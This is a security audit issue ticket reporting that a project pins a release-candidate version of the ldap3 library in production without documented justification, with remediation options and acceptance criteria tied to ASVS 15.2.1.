## Issue: FINDING-492 - Pre-Release (Release Candidate) Dependency Used in Production

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application uses a release candidate version (ldap3==2.10.2rc3) in production without documented justification or special monitoring procedures. Release candidate versions have uncertain security patch processes and may not receive updates through standard channels, making the 30-day freshness policy less meaningful. Latest stable ldap3 release is 2.9.1. If a vulnerability is discovered, the fix may be released in stable 2.9.x branch but not backported to 2.10.x RC branch, creating unclear upgrade paths.

### Details
- **Dependency:** ldap3==2.10.2rc3 (release candidate)
- **Location:** `pip-audit.requirements` line 148
- **Latest stable:** 2.9.1
- **Issue:** RC version in production without documented justification
- **Risk:** Uncertain security patch process for RC versions

### Recommended Remediation

**Option A — Use stable version if possible:**
1. Test application functionality with ldap3==2.9.1
2. If no regressions, prefer stable over RC

**Option B — Document justification and establish explicit monitoring:**
1. Create DEPENDENCIES.md with section for Pre-Release Dependencies
2. Document why ldap3==2.10.2rc3 is required
3. Establish weekly manual checks of releases
4. Subscribe to security advisories
5. Define remediation target to upgrade to stable 2.10.x within 7 days of release

**Option C — Automated RC version monitoring:**
Implement `scripts/check_prerelease_deps.py` that detects pre-release versions and validates documentation exists.

### Acceptance Criteria
- [ ] Decision documented: use stable or document RC justification
- [ ] If using stable: regression testing completed
- [ ] If keeping RC: monitoring procedures established and documented
- [ ] Pre-release dependency policy added to documentation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:15.2.1.md
- Related findings: None
- ASVS sections: 15.2.1

### Priority
Low